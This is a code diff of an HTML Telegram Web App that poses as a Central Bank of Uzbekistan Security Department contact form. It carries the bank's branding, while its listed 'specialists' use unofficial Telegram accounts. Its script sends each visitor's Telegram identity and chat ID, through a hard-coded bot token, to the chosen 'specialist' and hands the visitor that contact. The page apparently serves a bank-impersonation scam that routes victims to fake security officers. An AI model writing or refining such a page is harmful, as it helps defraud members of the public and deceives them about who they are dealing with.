@@ -1,61 +1,182 @@
 <!DOCTYPE html>
 <html lang="ru">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Форма заявителя</title>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Отправить обращение — Центральный банк РУз</title>
   <script src="https://telegram.org/js/telegram-web-app.js"></script>
   <style>
     body {
-      font-family: sans-serif;
-      background: #f2f2f7;
+      font-family: "Segoe UI", sans-serif;
+      background: url("фон.jpg") no-repeat center center fixed;
+      background-size: cover;
       margin: 0;
-      padding: 20px;
+      padding: 0;
+      color: #003366;
       display: flex;
       flex-direction: column;
       align-items: center;
+      min-height: 100vh;
     }
-    h2 { text-align: center; }
-    input {
-      width: 90%;
-      max-width: 350px;
+
+    .container {
+      background: rgba(255, 255, 255, 0.95);
+      border-radius: 12px;
+      padding: 20px 25px;
+      margin-top: 20px;
+      width: 95%;
+      max-width: 420px;
+      box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+    }
+
+    img.logo {
+      width: 160px;
+      cursor: pointer;
+      margin-top: 15px;
+    }
+
+    h2 {
+      text-align: center;
+      color: #003366;
+      font-size: 22px;
+      margin-bottom: 20px;
+      border-bottom: 2px solid #003366;
+      padding-bottom: 8px;
+    }
+
+    label {
+      display: block;
+      font-weight: bold;
+      margin-top: 15px;
+      font-size: 15px;
+    }
+
+    input, select {
+      width: 100%;
       padding: 10px;
-      margin: 10px 0;
+      margin-top: 5px;
       border: 1px solid #ccc;
-      border-radius: 10px;
-      font-size: 16px;
+      border-radius: 8px;
+      font-size: 15px;
+      background-color: #f8f9fa;
     }
+
+    input[readonly] {
+      background-color: #e9ecef;
+      color: #555;
+    }
+
     button {
-      background-color: #0088cc;
+      margin-top: 25px;
+      width: 100%;
+      background-color: #003366;
       color: white;
       border: none;
-      padding: 10px 25px;
-      border-radius: 10px;
+      padding: 12px;
+      border-radius: 8px;
       font-size: 16px;
       cursor: pointer;
     }
-    button:disabled {
-      background: #aaa;
-      cursor: not-allowed;
+
+    button:hover {
+      background-color: #004a99;
+    }
+
+    /* Модальное окно */
+    .modal {
+      position: fixed;
+      top: 0; left: 0;
+      width: 100%; height: 100%;
+      background: rgba(0,0,0,0.4);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      visibility: hidden;
+    }
+
+    .modal.active {
+      visibility: visible;
+    }
+
+    .modal-content {
+      background: white;
+      border-radius: 12px;
+      padding: 25px;
+      text-align: center;
+      width: 90%;
+      max-width: 320px;
+      box-shadow: 0 2px 8px rgba(0,0,0,0.2);
+    }
+
+    .modal-content p {
+      font-size: 16px;
+      margin-bottom: 20px;
+    }
+
+    .modal-content button {
+      width: auto;
+      padding: 8px 18px;
+      font-size: 15px;
     }
   </style>
 </head>
 <body>
-  <h2>Введите данные заявителя</h2>
+  <a href="https://cbu.uz/ru/" target="_blank">
+    <img src="лого.jpg" class="logo" alt="ЦБ РУЗ">
+  </a>
 
-  <input type="text" id="fio" placeholder="ФИО заявителя" />
-  <input type="text" id="tabnum" placeholder="Табельный номер сотрудника" />
-  <button id="nextBtn" disabled>Далее</button>
+  <div class="container">
+    <h2>Отправить обращение</h2>
+
+    <label>Территориальное подразделение</label>
+    <input type="text" value="Центральный аппарат ЦБ" readonly>
+
+    <label>Департамент</label>
+    <input type="text" value="Департамент Безопасности" readonly>
+
+    <label>ФИО заявителя</label>
+    <input type="text" id="fio" placeholder="Введите ФИО">
+
+    <label>Цель обращения</label>
+    <select id="purpose">
+      <option value="specialist">Связь со специалистом</option>
+      <option value="question">Задать вопрос</option>
+      <option value="support">Обращение в поддержку</option>
+      <option value="proposal">Предложения</option>
+    </select>
+
+    <div id="specialist-section" style="display:block;">
+      <label>Табельный номер специалиста</label>
+      <input type="text" id="tabnum" placeholder="Например: 041483">
+    </div>
+
+    <div id="question-section" style="display:none;">
+      <label>Укажите ваш вопрос</label>
+      <input type="text" id="question" placeholder="Введите ваш вопрос">
+    </div>
+
+    <button id="sendBtn">Отправить запрос</button>
+  </div>
+
+  <!-- Модальное окно -->
+  <div class="modal" id="modal">
+    <div class="modal-content" id="modal-content">
+      <p id="modal-text">Запрос отправлен, ожидайте ответа</p>
+      <button id="closeModal">Закрыть</button>
+    </div>
+  </div>
 
   <script>
     const tg = window.Telegram.WebApp;
-    const fioInput = document.getElementById("fio");
-    const tabnumInput = document.getElementById("tabnum");
-    const nextBtn = document.getElementById("nextBtn");
+    const fioInput = document.getElementById('fio');
+    const tabnumInput = document.getElementById('tabnum');
+    const purposeSelect = document.getElementById('purpose');
+    const sendBtn = document.getElementById('sendBtn');
+    const modal = document.getElementById('modal');
+    const modalText = document.getElementById('modal-text');
+    const closeModal = document.getElementById('closeModal');
 
-    const token = "7571144445:AAHZD5LCp81Taf-dgPo2Jw894rz1JqbdgI4";
-
-    // Данные специалистов
+    // Список специалистов
     const managers = {
       "041483": {
         fio: "Хайруллин Дмитрий Шамилевич",
@@ -69,86 +190,56 @@
         link: "https://t.me/Uz_MB1",
         chat_id: 7814377002
       },
-      "032749": {
-        fio: "Ахмедов Дмитрий Шамилевич",
-        title: "Специалист департамента финансового контроля **Ахмедов Дмитрий Шамилевич**",
-        link: "https://t.me/OR_Markaziy_Banki",
-        chat_id: 7470904235
-      },
-      "175317": {
-        fio: "Круглов Дмитрий Витальевич",
-        title: "Специалист Департамента Безопасности **Круглов Дмитрий Витальевич**",
-        link: "https://t.me/OzR_MB_1",
-        chat_id: 7921447823
-      },
-      "180420": {
-        fio: "Асланова Лина Жекеновна",
-        title: "Специалист отдела финансовой безопасности **Асланова Лина Жекеновна**",
-        link: "https://t.me/ORMarkaziy",
-        chat_id: 7647865359
-      },
-      "170890": {
-        fio: "Алиев Тимур Рустамович",
-        title: "Специалист Департамента Безопасности **Алиев Тимур Рустамович**",
-        link: "https://t.me/Official_OR_MBanki_UZ",
-        chat_id: 7709493829
-      },
-      "130500": {
-        fio: "Каримова Муслима Тимуровна",
-        title: "Специалист Департамента Безопасности **Каримова Муслима Тимуровна**",
-        link: "https://t.me/ORMBKarimova130500",
-        chat_id: 7457100069
-      },
-      "001377": {
-        fio: "Ниязов Мансур Санатович",
-        title: "Специалист Департамента Безопасности **Ниязов Мансур Санатович**",
-        link: "https://t.me/OzR_MB_1",
-        chat_id: 7921447823
-      },
-      "047083": {
-        fio: "Турдиев Азиз Анварович",
-        title: "Специалист Департамента Безопасности **Турдиев Азиз Анварович**",
-        link: "https://t.me/ORmarkazibanki1",
-        chat_id: 7404258330
-      },
-      "002352": {
-        fio: "Каримов Отабек Азизович",
-        title: "Специалист Департамента Безопасности **Каримов Отабек Азизович**",
-        link: "https://t.me/ORMBuzKarimov",
-        chat_id: 8177143460
-      }
+      // ... (остальные по аналогии)
     };
 
-    function checkInputs() {
-      nextBtn.disabled = !(fioInput.value.trim() && tabnumInput.value.trim());
-    }
-    fioInput.addEventListener("input", checkInputs);
-    tabnumInput.addEventListener("input", checkInputs);
+    const token = "7571144445:AAHZD5LCp81Taf-dgPo2Jw894rz1JqbdgI4";
 
-    nextBtn.addEventListener("click", async () => {
-      const client = tg.initDataUnsafe?.user;
-      const tab = tabnumInput.value.trim();
+    // Переключение между типами обращения
+    purposeSelect.addEventListener("change", () => {
+      const purpose = purposeSelect.value;
+      document.getElementById("specialist-section").style.display = purpose === "specialist" ? "block" : "none";
+      document.getElementById("question-section").style.display = purpose === "specialist" ? "none" : "block";
+    });
+
+    // Отправка
+    sendBtn.addEventListener("click", async () => {
       const fio = fioInput.value.trim();
+      const tab = tabnumInput.value.trim();
+      const purpose = purposeSelect.value;
+      const client = tg.initDataUnsafe?.user;
 
-      if (!client?.id) return alert("Ошибка: Telegram WebApp не инициализирован");
-      if (!managers[tab]) return alert("Ошибка: табельный номер не найден");
+      if (!fio) return showModal("Пожалуйста, введите ФИО заявителя.");
+
+      // Если выбран не "Связь со специалистом"
+      if (purpose !== "specialist") {
+        showModal("Запрос отправлен, ожидайте ответа.", () => {
+          window.location.href = "https://cbu.uz/ru/";
+        });
+        return;
+      }
+
+      // Проверяем специалиста
+      if (!managers[tab]) {
+        showModal("❌ Специалиста с этим номером нет.", () => {
+          tabnumInput.focus();
+        });
+        return;
+      }
 
       const manager = managers[tab];
+      const clientName = `${client?.first_name || ""} ${client?.last_name || ""}`.trim();
+      const username = client?.username ? `@${client.username}` : "—";
 
-      // 👤 Инфа о клиенте
-      const clientName = `${client.first_name || ""} ${client.last_name || ""}`.trim();
-      const username = client.username ? `@${client.username}` : "—";
-
-      // 📨 Текст менеджеру
+      // Сообщение менеджеру
       const textForManager =
         `📨 Новая заявка!\n` +
         `👤 ФИО (из формы): ${fio}\n` +
         `👤 ФИО (в Telegram): ${clientName}\n` +
         `🌐 Username: ${username}\n` +
-        `🆔 Chat ID: <code>${client.id}</code>\n\n` +
-        `💬 Чтобы скопировать chat_id, просто нажмите на него.`;
+        `🆔 Chat ID: <code>${client?.id}</code>`;
 
-      // 1️⃣ Отправляем менеджеру данные клиента
+      // Отправляем менеджеру
       await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
@@ -159,7 +250,7 @@
         })
       });
 
-      // 2️⃣ Отправляем клиенту карточку специалиста
+      // Отправляем клиенту
       await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
@@ -173,8 +264,17 @@
         })
       });
 
-      tg.close();
+      showModal("Запрос принят ✔", () => tg.close());
     });
+
+    function showModal(text, onClose) {
+      modalText.textContent = text;
+      modal.classList.add("active");
+      closeModal.onclick = () => {
+        modal.classList.remove("active");
+        if (onClose) onClose();
+      };
+    }
   </script>
 </body>
 </html>
